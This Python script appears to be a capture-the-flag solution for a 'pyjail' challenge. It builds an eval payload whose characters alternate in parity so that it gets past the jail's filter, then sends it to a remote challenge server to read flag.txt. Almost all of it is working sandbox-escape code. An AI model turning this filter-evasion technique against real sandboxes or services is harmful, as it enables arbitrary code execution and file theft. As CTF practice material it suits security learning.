from CTF_Library import *

def get_parity(s: str):
	par = ""
	for c in s:
		par += str(ord(c) % 2)
	return par
def report(word: str):
	print(word.encode())
	print(get_parity(word))
	print()
for word in ["\'", "\"", "eval", "exec", " ", "+", "=", "#", ",", ";", "\n"]:
	report(word)

def construct(obj : str):
	n = len(obj)

	def p(i):
		return ord(obj[i]) % 2

	res = " eval\t("
	par = 1
	i = 0
	while i < n:
		j = i + 1
		while j + 2 <= n and p(j - 1) != p(j) and p(j) != p(j + 1):
			j += 2

		target = obj[i : j]
		if ord(target[0]) % 2 == 0:
			target = "\'" + target + "\'"
		else:
			target = "\"" + target + "\""

		# insert space
		if par != ord(target[0]) % 2:
			if par == 0:
				res += " "
			else:
				res += "\t"
			par ^= 1

		# insert target
		res += target
		par ^= 1

		if j != n:
			if par == 0:
				res += " "
				par ^= 1

			res += "+"
			par ^= 1

		i = j

	res += ")"

	return res

obj = "print(open(\"flag.txt\").read())"
code = construct(obj)
report(code)

print(code)

for i, c in enumerate(code):
	assert ord(c) < 128 and i % 2 == ord(c) % 2

nc = remote("challs2.pyjail.club", 7991)

print(nc.recvuntil(b"> ").decode())
nc.sendline(code.encode())
print(nc.recvline().decode())
